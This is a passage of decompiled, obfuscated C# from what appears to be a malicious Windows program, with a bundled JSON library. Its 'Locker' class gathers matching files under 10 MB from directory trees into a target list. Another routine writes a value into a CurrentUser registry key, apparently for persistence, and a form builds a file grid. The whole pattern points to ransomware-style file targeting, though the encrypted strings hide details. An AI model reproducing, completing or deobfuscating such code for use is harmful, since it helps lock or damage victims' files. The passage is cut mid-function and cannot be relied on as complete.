        int num10 = \u0013.\u000F.\u0005.\u0001[obj0.\u0006];
        int num11 = num1 + num10;
label_35:
        if (false)
          goto label_3;
label_37:
        num2 = num11--;
label_38:
        if (num2 > 0)
        {
          obj0.\u0002[obj0.\u0007++] = obj0.\u0001;
          goto label_37;
        }
        else
        {
          num3 = obj0.\u0007;
          num4 = obj0.\u0005;
        }
label_40:
        if (num3 != num4)
          obj0.\u0001 = 4;
        else
          goto label_41;
      }
label_2:
      return false;
label_5:
      return false;
label_8:
      return false;
label_13:
      return false;
label_21:
      return true;
label_26:
      return false;
label_32:
      return false;
label_41:
      return true;
    }

    static void \u0001([In] CultureInfo obj0, [In] JsonWriter obj1) => obj1.\u0001 = obj0;

    static \u000E.\u0001 \u0001([In] JsonWriter obj0) => obj0.\u0001;

    static void \u0001([In] \u0005.\u0004 obj0, [In] ulong obj1)
    {
label_0:
      long num1 = (long) obj1;
      int num2;
      int num3;
      if (true)
      {
        if ((ulong) num1 <= 9UL)
        {
          if (true)
          {
            \u009B.\u007E\u0010\u0004((object) obj0.\u0001, (char) (48L + (long) obj1));
            return;
          }
        }
        else
          goto label_8;
label_4:
        num2 = 0;
        goto label_5;
label_8:
        \u0014.\u0006.\u0001(obj0);
        if (true)
        {
          num3 = \u0014.\u0006.\u0001(obj1);
          goto label_4;
        }
        else
          goto label_0;
      }
      else
        goto label_6;
label_5:
      obj0.\u0001[num3 - ++num2] = (char) (48UL + obj1 % 10UL);
      obj1 /= 10UL;
      num1 = (long) obj1;
label_6:
      if (num1 == 0L)
        \u009E.\u007E\u0015\u0004((object) obj0.\u0001, obj0.\u0001, 0, num2);
      else
        goto label_5;
    }

    static Guid? \u0001([In] \u0015.\u0013 obj0)
    {
label_0:
      while (obj0 != null)
      {
        \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
        Guid guid;
        while (obj != null && \u0014.\u0006.\u0001(true, \u0015.\u0013.\u0004, (\u0015.\u0013) obj))
        {
          do
          {
            if (true)
            {
              if (obj.\u0001 != null)
                goto label_8;
            }
            else
              goto label_0;
          }
          while (false);
          return new Guid?();
label_8:
          if (obj.\u0001 is byte[])
            return new Guid?(new Guid((byte[]) obj.\u0001));
          if (!(obj.\u0001 is Guid))
          {
            if (true)
            {
              guid = new Guid(Convert.ToString(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
              goto label_14;
            }
          }
          else
            goto label_13;
        }
        if (true)
          throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(5935), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
label_13:
        guid = (Guid) obj.\u0001;
label_14:
        return new Guid?(guid);
      }
      return new Guid?();
    }

    static bool \u0001(
      \u0012.\u0007 _param0,
      ref object _param1,
      JsonSerializerInternalReader _param2,
      ref \u0005.\u0005 _param3,
      object _param4,
      ref \u0016.\u0007 _param5,
      out bool _param6,
      [Out] JsonProperty _param7,
      out bool _param8,
      [Out] \u0006.\u0002 _param9,
      [In] JsonProperty obj10)
    {
      _param1 = (object) null;
      _param8 = false;
      _param5 = (\u0016.\u0007) null;
      _param6 = false;
      if (false)
        goto label_15;
      else
        goto label_30;
label_11:
      int num1 = _param7.\u0003() ? 1 : 0;
label_12:
      if (num1 == 0 && !_param8)
        return true;
label_15:
      JsonToken jsonToken;
      if (_param7.\u0001().GetValueOrDefault(_param2.\u0001.\u0001) == \u0011.\u0005.\u0002 && jsonToken == JsonToken.Null)
        return true;
      num1 = \u0014.\u0006.\u0001(_param2, _param7.\u0001().GetValueOrDefault(_param2.\u0001.\u0001), \u0008.\u0004.\u0002) ? 1 : 0;
      if (true)
      {
        if (num1 != 0)
        {
          int num2 = \u0014.\u0006.\u0001(_param2, _param7.\u0001().GetValueOrDefault(_param2.\u0001.\u0001), \u0008.\u0004.\u0003) ? 1 : 0;
          if (false)
            return num2 != 0;
          if (num2 == 0)
          {
            if (true)
            {
              if (\u0014.\u0006.\u0001(jsonToken) && \u0008.\u0008.\u0001(_param0.\u0001(), \u0014.\u0006.\u0001(_param7)))
              {
                num1 = 1;
                goto label_24;
              }
            }
            else
              goto label_11;
          }
        }
        if (_param1 == null)
        {
          _param5 = _param7.\u0001();
        }
        else
        {
          _param5 = \u0014.\u0006.\u0001(_param2, \u0001\u0002.\u007E\u0017\u0004(_param1));
          if (_param5 != _param7.\u0001())
            _param3 = \u0014.\u0006.\u0001(_param2, _param5, _param7.\u0002(), _param9, obj10);
        }
        return false;
      }
label_24:
      if (num1 != 0)
        return num1 != 0;
      goto label_12;
label_30:
      if (_param7.\u0001())
        return true;
      int num3 = (int) _param0.\u0001();
      if (true)
        goto label_32;
label_3:
      if (_param7.\u0001() == null)
        _param7.\u0001(\u0014.\u0006.\u0001(_param2, _param7.\u0001));
      if (_param7.\u0001().GetValueOrDefault(_param2.\u0001.\u0001) != \u0016.\u0002.\u0003)
      {
        if (true)
        {
          if ((jsonToken == JsonToken.StartArray || jsonToken == JsonToken.StartObject) && _param7.\u0002())
          {
            _param1 = _param7.\u0001().\u0001(_param4);
            _param6 = true;
            if (_param1 != null)
              _param5 = \u0014.\u0006.\u0001(_param2, \u0001\u0002.\u007E\u0017\u0004(_param1));
            else
              goto label_11;
          }
          else
            goto label_11;
        }
        _param8 = !_param5.\u0004 && !\u0015.\u000E.\u000E(_param5.\u0002());
        goto label_11;
      }
      else
        goto label_11;
label_32:
      jsonToken = (JsonToken) num3;
      goto label_3;
    }

    static unsafe object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] IDictionary obj1,
      [In] \u0012.\u0007 obj2,
      [In] \u0003.\u0006 obj3,
      [In] JsonProperty obj4,
      [In] string obj5)
    {
      int num1 = 5;
      object obj6;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
        obj6 = obj1 is \u0010.\u0003 obj7 ? obj7.\u0001() : (object) obj1;
        switch (obj5)
        {
          case null:
            \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, obj6);
            *(int*) voidPtr = obj2.\u0001();
            if (obj3.\u0001() == null)
              obj3.\u0001(\u0014.\u0006.\u0001(obj0, obj3.\u0001()));
            if (((\u0006.\u0002) obj3).\u0001 == null)
              \u0014.\u0006.\u0001((\u0006.\u0002) obj3, \u0014.\u0006.\u0001(obj0, obj3.\u0003()));
            \u0005.\u0005 obj8 = ((\u0006.\u0002) obj3).\u0001() ?? \u0014.\u0006.\u0001(obj0, ((\u0006.\u0002) obj3).\u0001, (\u0005.\u0005) null, (\u0006.\u0002) obj3, obj4);
            \u000F.\u0003 obj9 = obj3.\u0001() is \u0005.\u0008 ? ((\u0005.\u0008) obj3.\u0001()).\u0001() : \u000F.\u0003.\u0001;
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
label_9:
            switch (obj2.\u0001())
            {
              case JsonToken.PropertyName:
                object obj10 = obj2.\u0001();
                if (!\u0014.\u0006.\u0001(obj2, global::\u0001.\u007E\u0001(obj10), obj0))
                {
                  try
                  {
                    try
                    {
                      switch (obj9)
                      {
                        case \u000F.\u0003.\u007F:
                        case \u000F.\u0003.\u0080:
                          DateTime dateTime;
                          if (\u0014.\u0006.\u0001(global::\u0001.\u007E\u0001(obj10), obj2.\u0001, obj2.\u0001, \u0014.\u0006.\u0001(obj2), out dateTime))
                          {
                            if (true)
                            {
                              obj10 = (object) dateTime;
                              goto label_22;
                            }
                            else
                              break;
                          }
                          else
                          {
                            obj10 = \u0014.\u0006.\u0001(obj0, obj2, obj10, \u0098.\u0002\u0004(), obj3.\u0001(), obj3.\u0001());
                            goto label_22;
                          }
                        case \u000F.\u0003.\u0081:
                        case \u000F.\u0003.\u0082:
                          DateTimeOffset dateTimeOffset;
                          if (\u0014.\u0006.\u0001(global::\u0001.\u007E\u0001(obj10), obj2.\u0001, \u0014.\u0006.\u0001(obj2), out dateTimeOffset))
                          {
                            if (true)
                            {
                              obj10 = (object) dateTimeOffset;
                              goto label_22;
                            }
                            else
                              goto default;
                          }
                          else
                            break;
                        default:
                          obj10 = \u0014.\u0006.\u0001(obj0, obj2, obj10, \u0098.\u0002\u0004(), obj3.\u0001(), obj3.\u0001());
                          goto label_22;
                      }
                      obj10 = \u0014.\u0006.\u0001(obj0, obj2, obj10, \u0098.\u0002\u0004(), obj3.\u0001(), obj3.\u0001());
                    }
                    catch (Exception ex)
                    {
                      throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23513), (IFormatProvider) \u0098.\u0002\u0004(), obj2.\u0001(), (object) obj3.\u0001()), ex, obj2);
                    }
label_22:
                    int num2;
                    for (int index = \u0014.\u0006.\u0001(obj0, obj2, ((\u0006.\u0002) obj3).\u0001, obj8 != null) ? 1 : 0; index != 0; index = num2)
                    {
                      object obj11;
                      if (obj8 != null)
                      {
                        if (true)
                        {
                          num2 = obj8.\u0002() ? 1 : 0;
                          if (false)
                            continue;
                          if (num2 != 0)
                          {
                            obj11 = \u0014.\u0006.\u0001(obj0, obj8, obj2, obj3.\u0003(), (object) null);
                            goto label_31;
                          }
                        }
                        else
                          goto label_31;
                      }
                      obj11 = \u0014.\u0006.\u0001(obj0, obj2, obj3.\u0003(), ((\u0006.\u0002) obj3).\u0001, (JsonProperty) null, (\u0006.\u0002) obj3, obj4, (object) null);
label_31:
                      \u0086\u0002.\u007E\u0099\u0005((object) obj1, obj10, obj11);
                      goto case JsonToken.Comment;
                    }
                    throw \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(10226));
                  }
                  catch (Exception ex)
                  {
                    if (\u0014.\u0006.\u0001(obj2.\u0001(), obj6, obj10, ex, obj2 as \u000F.\u0001, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
                    {
                      do
                      {
                        \u0014.\u0006.\u0001(obj2, obj0, *(int*) voidPtr, true);
                      }
                      while (false);
                      goto case JsonToken.Comment;
                    }
                    else
                      throw;
                  }
                }
                else
                  goto case JsonToken.Comment;
              case JsonToken.Comment:
                if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0 || !obj2.\u0001())
                {
                  int num3 = (int) *(sbyte*) ((IntPtr) voidPtr + 4);
                  if (false)
                  {
                    num1 = num3;
                    continue;
                  }
                  if (num3 == 0)
                    \u0014.\u0006.\u0001(obj6, obj0, (\u0016.\u0007) obj3, \u0014.\u0006.\u0082(10226), obj2);
                  \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, obj6);
                  if (false)
                    goto case JsonToken.EndObject;
                  else
                    goto label_43;
                }
                else
                  goto label_9;
              case JsonToken.EndObject:
                *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
                goto case JsonToken.Comment;
              default:
                goto label_37;
            }
          default:
            \u0014.\u0006.\u0001(obj2, obj0, obj6, obj5);
            goto case null;
        }
      }
label_37:
      throw \u0014.\u0006.\u0001(obj2, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(15958), (object) obj2.\u0001()));
label_43:
      return obj6;
    }

    static \u0004.\u000F<object> \u0001([In] \u0011.\u0008 obj0) => obj0.\u0002;

    static void \u0001([In] \u0016.\u0007 obj0, [In] System.Type obj1)
    {
label_0:
      obj0.\u0002 = obj1;
label_1:
      if (true)
      {
        obj0.\u0005 = \u0015.\u000E.\u0007(obj0.\u0002);
        if (true)
        {
          if (false)
            return;
          obj0.\u0006 = !\u0015.\u000E.\u0002(obj0.\u0002) && !\u0015.\u000E.\u0008(obj0.\u0002);
        }
        else
          goto label_1;
      }
      else
        goto label_0;
    }

    static bool \u0001([In] System.Type obj0) => \u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IConvertible)), obj0);

    static IXmlNode \u0001([In] XmlNodeConverter obj0, [In] object obj1)
    {
      if (obj1 is XObject)
        return \u0014.\u0006.\u0001((XObject) obj1);
      while (obj1 is XmlNode)
      {
        if (true)
          return \u0014.\u0006.\u0001((XmlNode) obj1);
      }
      throw new ArgumentException(\u0014.\u0006.\u0082(23695), \u0014.\u0006.\u0082(4207));
    }

    static void \u0001([In] string obj0_1, [In] string obj1_1, [In] HashSet<string> obj2)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Locker.\u0002 obj1 = new Locker.\u0002();
      // ISSUE: reference to a compiler-generated field
      obj1.\u0001 = obj2;
      IEnumerable<string> source = \u0014.\u0006.\u0001(obj0_1);
      // ISSUE: reference to a compiler-generated field
      Func<string, IEnumerable<string>> collectionSelector = obj1.\u0001;
      if (collectionSelector == null)
      {
        // ISSUE: variable of a compiler-generated type
        Locker.\u0002 obj3 = obj1;
        // ISSUE: variable of a compiler-generated type
        Locker.\u0002 obj4 = obj1;
        // ISSUE: method pointer
        IntPtr method = __methodptr(\u0001);
        Func<string, IEnumerable<string>> func1;
        Func<string, IEnumerable<string>> func2 = func1 = new Func<string, IEnumerable<string>>((object) obj4, method);
        // ISSUE: reference to a compiler-generated field
        obj3.\u0001 = func1;
        collectionSelector = func2;
      }
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      foreach (string str in source.SelectMany(collectionSelector, (obj0_2, obj1_2) => new \u003C\u003Ef__AnonymousType0<string, string>(obj0_2, obj1_2)).Where(obj0_3 => obj0_3.\u0001().EndsWith(obj0_3.\u0001())).Select(obj0_4 => obj0_4.\u0001()).Select(obj0_5 => new \u003C\u003Ef__AnonymousType1<string, FileInfo>(obj0_5, new FileInfo(obj0_5))).Where(obj0_6 => obj0_6.\u0001().Length < 10000000L).Select(obj0_7 => obj0_7.\u0001()))
      {
        try
        {
          if (\u0014.\u0006.\u0001(str, obj1_1))
            Locker.\u0001.Add(str);
        }
        catch
        {
        }
      }
    }

    static void \u0001([In] \u0015.\u0013 obj0, [In] \u000F.\u0001 obj1, [In] \u000F.\u0007 obj2)
    {
      do
      {
        if (true)
          goto label_6;
label_5:
        if (false)
          goto label_7;
        else
          goto label_3;
label_6:
        if (obj2 != null && obj2.\u0001 == \u0016.\u000E.\u0002)
          break;
label_7:
        if (obj1 != null && obj1.\u0002())
        {
          \u0014.\u0006.\u0001(obj0, obj1.\u0002(), obj1.\u0003());
          goto label_5;
        }
      }
      while (false);
      return;
label_3:;
    }

    static long \u0001([In] DateTime obj0, [In] bool obj1)
    {
      long num1;
      if (!obj1)
      {
        long ticks = obj0.Ticks;
        num1 = false ? ticks : ticks;
      }
      else
        goto label_7;
label_2:
      long num2 = \u0004.\u0007.\u0001;
      do
      {
        if (true)
        {
          long num3 = num1 - num2;
          num2 = 10000L;
          num1 = num3;
        }
      }
      while (false);
      return num1 / num2;
label_7:
      num1 = \u0014.\u0006.\u0001(obj0);
      goto label_2;
    }

    static DateTime \u0001([In] \u0010.\u0002 obj0)
    {
      bool flag;
      if (obj0.\u0004 == 24)
      {
        flag = true;
        obj0.\u0004 = 0;
      }
      else
        flag = false;
      DateTime dateTime = new DateTime(obj0.\u0001, obj0.\u0002, obj0.\u0003, obj0.\u0004, obj0.\u0005, obj0.\u0006).AddTicks((long) obj0.\u0007);
      if (flag)
        dateTime = dateTime.AddDays(1.0);
      return dateTime;
    }

    static byte[] \u0001([In] \u0012.\u0007 obj0)
    {
      List<byte> byteList = new List<byte>();
      JsonToken jsonToken;
      while (true)
      {
        jsonToken = \u0014.\u0006.\u0001(obj0);
        switch (jsonToken)
        {
          case JsonToken.None:
            goto label_5;
          case JsonToken.Integer:
            byteList.Add(\u009E\u0003.\u0092\u0007(obj0.\u0001(), (IFormatProvider) \u0098.\u0002\u0004()));
            continue;
          case JsonToken.EndArray:
            goto label_2;
          default:
            goto label_3;
        }
      }
label_2:
      byte[] array = byteList.ToArray();
      \u0014.\u0006.\u0001(obj0, JsonToken.Bytes, (object) array, false);
      return array;
label_3:
      throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23736), (IFormatProvider) \u0098.\u0002\u0004(), (object) jsonToken));
label_5:
      throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(16344));
    }

    static bool \u0001([In] \u0012.\u0007 obj0, [In] string obj1, [In] JsonSerializerInternalReader obj2)
    {
      if (obj2.\u0001.\u0001() != \u0008.\u0003.\u0002 || !\u0007\u0002.\u008C\u0004(obj1, \u0014.\u0006.\u0082(9822)) && !\u0007\u0002.\u008C\u0004(obj1, \u0014.\u0006.\u0082(9520)) && !\u0007\u0002.\u008C\u0004(obj1, \u0014.\u0006.\u0082(9813)) && !\u0007\u0002.\u008C\u0004(obj1, \u0014.\u0006.\u0082(9827)))
        return false;
      \u0014.\u0006.\u0001(obj0);
      return true;
    }

    static void \u0001([In] string obj0)
    {
      RegistryKey registryKey;
      if (true)
      {
        registryKey = \u0016\u0005.\u007E\u0011\u000E((object) Registry.CurrentUser, \u0014.\u0006.\u0082(23793), true);
        goto label_5;
      }
label_3:
      \u0017\u0005.\u007E\u0012\u000E((object) registryKey, \u001B.\u0006\u0003(obj0), false);
      if (true)
        return;
label_5:
      if (registryKey != null)
        goto label_3;
    }

    static bool \u0001(
      [In] object obj0,
      [In] \u0016.\u0007 obj1,
      [In] JsonProperty obj2,
      [In] JsonProperty obj3,
      [In] \u0006.\u0002 obj4,
      [In] \u0010.\u0006 obj5)
    {
      if (obj0 == null || obj1.\u0001 == \u0003.\u0005.\u0004 || obj1.\u0001 == \u0003.\u0005.\u0005)
        return false;
      bool? nullable;
      do
      {
        nullable = \u0014.\u0006.\u0001(obj5, obj1, obj2, obj4, obj3);
      }
      while (false);
      if (!nullable.HasValue)
      {
        while (obj1.\u0001 == \u0003.\u0005.\u0003)
        {
          if (true)
          {
            nullable = new bool?(\u0014.\u0006.\u0001(\u0012.\u0003.\u0003, ((\u0016.\u0008) obj5).\u0001.\u0001, obj5));
            goto label_7;
          }
        }
        nullable = new bool?(\u0014.\u0006.\u0001(\u0012.\u0003.\u0002, ((\u0016.\u0008) obj5).\u0001.\u0001, obj5));
      }
label_7:
      return nullable.GetValueOrDefault() && \u0014.\u0006.\u0001(((\u0016.\u0008) obj5).\u0001).\u0001((object) obj5, obj0);
    }

    static JsonReaderException \u0001([In] string obj0, [In] \u0012.\u0007 obj1, [In] Exception obj2) => \u0014.\u0006.\u0001(obj1.\u0001(), obj0, obj2, obj1 as \u000F.\u0001);

    static bool \u0001(object _param0, CultureInfo _param1, System.Type _param2, out object _param3)
    {
      bool flag;
      try
      {
        if (\u0014.\u0006.\u0001(_param2, ref _param3, _param1, _param0) == \u0004.\u0006.\u0002.\u0001)
        {
          if (true)
            flag = true;
        }
        else
        {
          do
          {
            _param3 = (object) null;
          }
          while (false);
          flag = false;
        }
      }
      catch
      {
        _param3 = (object) null;
        flag = false;
      }
      return flag;
    }

    static float \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9011), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u0018\u0005.\u0013\u000E(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static bool \u0001(\u0004.\u0001 _param0, \u0015.\u0008 _param1, out DateTime _param2)
    {
      DateTimeKind dateTimeKind;
      long num1;
      if (true)
      {
        TimeSpan timeSpan;
        if (!\u0014.\u0006.\u0001(ref timeSpan, _param1, out dateTimeKind, out num1))
        {
          _param2 = new DateTime();
          return false;
        }
      }
      else
        goto label_16;
label_14:
      long num2 = num1;
      long ticks;
      while (true)
      {
        long num3 = 10000;
        do
        {
          if (true)
          {
            long num4 = num2 * num3;
            num3 = \u0004.\u0007.\u0001;
            num2 = num4;
          }
        }
        while (false);
        ticks = num2 + num3;
        if (false)
          num2 = ticks;
        else if (false)
          num2 = ticks;
        else
          break;
      }
      DateTime dateTime1 = new DateTime(ticks, DateTimeKind.Utc);
      DateTime dateTime2;
      if (true)
        dateTime2 = dateTime1;
label_16:
      if (dateTimeKind == DateTimeKind.Unspecified)
        goto label_18;
      else
        goto label_17;
label_11:
      _param2 = \u0014.\u0006.\u0001(_param2, _param0);
      if (true)
        return true;
      goto label_14;
label_17:
      int num5 = (int) dateTimeKind;
      _param2 = num5 == 2 ? dateTime2.ToLocalTime() : dateTime2;
      goto label_11;
label_18:
      _param2 = \u0019\u0005.\u0014\u000E(dateTime2.ToLocalTime(), DateTimeKind.Unspecified);
      goto label_11;
    }

    static object \u0001([In] object obj0, [In] System.Type obj1, [In] System.Type obj2)
    {
      System.Type type = obj0 != null ? \u0001\u0002.\u007E\u0017\u0004(obj0) : (System.Type) null;
      if (obj0 != null)
      {
        if (\u0093\u0002.\u007E\u0012\u0006((object) obj2, type))
          return obj0;
      }
      else
        goto label_6;
label_2:
      Func<object, object> func = \u0004.\u0006.\u0001.\u0001(new \u0004.\u0006.\u0001(type, obj2));
label_3:
      if (true)
      {
        if (func != null)
          return func(obj0);
        goto label_8;
      }
      else
        goto label_2;
label_6:
      if (\u0014.\u0006.\u0001(obj2))
        return (object) null;
label_8:
      if (true)
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23854), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1 != null ? (object) global::\u0001.\u007E\u0001((object) obj1) : (object) \u0014.\u0006.\u0082(17140), (object) obj2));
      goto label_3;
    }

    static bool \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0001, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17034), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u0090\u0003.\u0081\u0007(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static \u0011.\u0002 \u0001([In] \u0012.\u0007 obj0, [In] int obj1)
    {
      while (obj0.\u0001 != null && obj1 < obj0.\u0001.Count)
      {
        if (true)
          return obj0.\u0001[obj1];
      }
      return obj0.\u0001;
    }

    static bool \u0001([In] PropertyInfo obj0)
    {
      if (true)
        goto label_5;
label_1:
      int num1 = \u0008\u0002.\u007E\u008E\u0004((object) obj0).Length;
      int num2;
      while (true)
      {
        num2 = (uint) num1 > 0U ? 1 : 0;
        if (false)
          num1 = num2;
        else
          break;
      }
      return num2 != 0;
label_5:
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(23911));
      goto label_1;
    }

    static void \u0001([In] \u0014.\u0002 obj0)
    {
      obj0.\u0001 = new DataGridView();
      obj0.\u0001 = new DataGridViewTextBoxColumn();
      obj0.\u0002 = new DataGridViewTextBoxColumn();
      global::\u0011 obj = global::\u0011.\u007E\u0018\u0002;
      DataGridView dataGridView = obj0.\u0001;
      if (true)
        goto label_2;
label_1:
      global::\u0011.\u0014\u0002((object) obj0);
      \u001A\u0005.\u007E\u0015\u000E((object) obj0.\u0001, DataGridViewColumnHeadersHeightSizeMode.AutoSize);
      \u001C\u0005.\u007E\u0017\u000E((object) \u001B\u0005.\u007E\u0016\u000E((object) obj0.\u0001), new DataGridViewColumn[2]
      {
        (DataGridViewColumn) obj0.\u0001,
        (DataGridViewColumn) obj0.\u0002
      });
      \u001D\u0005.\u007E\u0018\u000E((object) obj0.\u0001, DockStyle.Fill);
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0001, new Point(0, 0));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(23924));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0001, new Size(594, 326));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0001, 0);
      \u0019.\u007E\u009B\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(23961));
      \u0019.\u007E\u009C\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(23974));
      global::\u0012.\u007E\u0089\u0002((object) obj0.\u0001, true);
      \u0018.\u007E\u0096\u0002((object) obj0.\u0001, 50);
      \u0019.\u007E\u009B\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(23995));
      \u0019.\u007E\u009C\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(24004));
      global::\u0012.\u007E\u0089\u0002((object) obj0.\u0002, true);
      \u0018.\u007E\u0096\u0002((object) obj0.\u0002, 500);
      \u0013\u0003.\u0098\u0006((object) obj0, new SizeF(6f, 13f));
      \u0014\u0003.\u0099\u0006((object) obj0, AutoScaleMode.Font);
      \u0015\u0003.\u009A\u0006((object) obj0, new Size(594, 326));
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0001);
      \u0019.\u009A\u0002((object) obj0, \u0014.\u0006.\u0082(24021));
      \u0019.\u007E\u0098\u0002((object) obj0, \u0014.\u0006.\u0082(24046));
      \u0012\u0003.\u0097\u0006((object) obj0, new EventHandler(obj0.\u0001));
      global::\u0011.\u007E\u0019\u0002((object) obj0.\u0001);
      global::\u0012.\u0086\u0002((object) obj0, false);
      return;
label_2:
      obj((object) dataGridView);
      goto label_1;
    }

    static bool \u0001([In] MemberInfo obj0, [In] bool obj1, [In] bool obj2)
    {
      switch (\u0015.\u000E.\u0001(obj0))
      {
        case MemberTypes.Field:
          FieldInfo fieldInfo = (FieldInfo) obj0;
          if (\u0015\u0002.\u007E\u001B\u0005((object) fieldInfo))
            return false;
          int num1;
          if (\u0015\u0002.\u007E\u001C\u0005((object) fieldInfo))
            num1 = obj2 ? 1 : 0;
          else
            goto label_9;
label_5:
          if (false)
            return num1 != 0;
          if (num1 == 0)
            return false;
label_9:
          if (obj1)
          {
            int num2 = 1;
            return num2 == 0 ? num2 != 0 : num2 != 0;
          }
          if (true)
          {
            num1 = \u0015\u0002.\u007E\u001D\u0005((object) fieldInfo) ? 1 : 0;
            if (true)
            {
              if (num1 == 0)
                return false;
              int num3 = 1;
              return num3 == 0 ? num3 != 0 : num3 != 0;
            }
            goto label_5;
          }
          else
            break;
        case MemberTypes.Property:
          PropertyInfo propertyInfo = (PropertyInfo) obj0;
          if (\u0015\u0002.\u007E\u001E\u0005((object) propertyInfo))
          {
            int num4 = obj1 ? 1 : 0;
            if (false)
              return num4 != 0;
            return num4 != 0 || \u0010\u0004.\u007E\u0002\u0008((object) propertyInfo, obj1) != null;
          }
          break;
        default:
          return false;
      }
      return false;
    }

    static bool \u0001(
      \u0015.\u0008 _param0,
      string _param1,
      CultureInfo _param2,
      out DateTimeOffset _param3)
    {
      if (_param0.\u0002() > 0)
      {
        int num1 = _param0.\u0001();
        int num2;
        if (_param0[num1] == '/')
        {
          if (_param0.\u0002() >= 9 && \u0014.\u0003.\u0001(_param0, \u0014.\u0006.\u0082(17828)))
          {
            if (true)
              num2 = \u0014.\u0003.\u0002(_param0, \u0014.\u0006.\u0082(17837)) ? 1 : 0;
            else
              goto label_10;
          }
          else
            goto label_18;
        }
        else
          goto label_12;
label_7:
        int num3;
        if (num2 != 0)
        {
          int num4 = \u0014.\u0006.\u0001(ref _param3, _param0) ? 1 : 0;
          if (true)
          {
            if (num4 == 0)
              goto label_18;
          }
          else
          {
            num3 = num4;
            goto label_14;
          }
        }
        else
          goto label_18;
label_10:
        return true;
label_12:
        if (_param0.\u0002() >= 19)
          num3 = _param0.\u0002();
        else
          goto label_18;
label_14:
        if (num3 <= 40)
        {
          num2 = \u009A.\u000E\u0004(_param0[num1]) ? 1 : 0;
          if (true)
          {
            if (num2 != 0 && _param0[num1 + 10] == 'T' && \u0014.\u0006.\u0001(ref _param3, _param0))
              return true;
          }
          else
            goto label_7;
        }
label_18:
        int num5 = global::\u0007.\u009E(_param1) ? 1 : 0;
        if (false)
          return num5 != 0;
        if (num5 == 0 && \u0014.\u0006.\u0001(_param2, ref _param3, _param0.ToString(), _param1))
          return true;
      }
      _param3 = new DateTimeOffset();
      int num = 0;
      if (num != 0)
        return num != 0;
      return num != 0 ? num != 0 : num != 0;
    }

    static string \u0001() => \u0006\u0003.\u007E\u008C\u0006((object) \u0014.\u0006.\u0001(), \u0014.\u0006.\u0082(24067), \u0005.\u0001.\u0001);

    static bool \u0001([In] string obj0, [In] bool obj1)
    {
      if (\u0007\u0002.\u008C\u0004(global::\u0004.\u0098(), obj0))
      {
        if (true)
          return false;
      }
      else
      {
        DirectoryInfo directoryInfo = global::\u0008.\u0002\u0002(global::\u0001.\u007E\u0001((object) global::\u0008.\u0003\u0002(obj0)));
        \u001E\u0005.\u0019\u000E(global::\u0004.\u0098(), obj0, obj1);
      }
      return true;
    }

    static unsafe bool \u0001([In] \u0011.\u0003 obj0, [In] bool obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      *(sbyte*) voidPtr = (sbyte) 0;
      if (true)
        goto label_18;
label_13:
      *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 1;
      ++obj0.\u0002;
label_15:
      int num1;
      int num2;
      while (true)
      {
        char ch;
        int num3;
        do
        {
          do
          {
            if (*(sbyte*) voidPtr == (sbyte) 0)
              goto label_19;
            else
              goto label_16;
label_1:
            int num4;
            int num5;
            if (num4 != num5)
              continue;
            goto label_11;
label_16:
            num1 = !obj1 ? 1 : 0;
